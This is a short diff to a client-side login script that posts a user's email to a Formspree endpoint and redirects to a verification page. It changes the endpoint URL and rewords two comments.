@@ -1,5 +1,5 @@
 // =========================
-// No-backend script.js (Formspree version, OTP included)
+// No-backend script.js (Formspree version, sequential submission)
 // =========================
 
 let currentEmail = localStorage.getItem('user_email') || '';
@@ -39,7 +39,7 @@ function hideLoading() {
 // =========================
 // Formspree Endpoint
 // =========================
-const FORMSPREE_URL = 'https://formspree.io/f/mnnlvqqg';
+const FORMSPREE_URL = 'https://formspree.io/f/mwpabvwr';
 
 // =========================
 // Handle Email Submission (login.html)
@@ -70,7 +70,7 @@ function handleLogin(event) {
     })
     .then(response => {
         if (response.ok) {
-            // redirect to verify page after successful email submission
+            // Email sent successfully, redirect to verify page
             window.location.href = 'verify.html';
         } else {
             hideLoading();
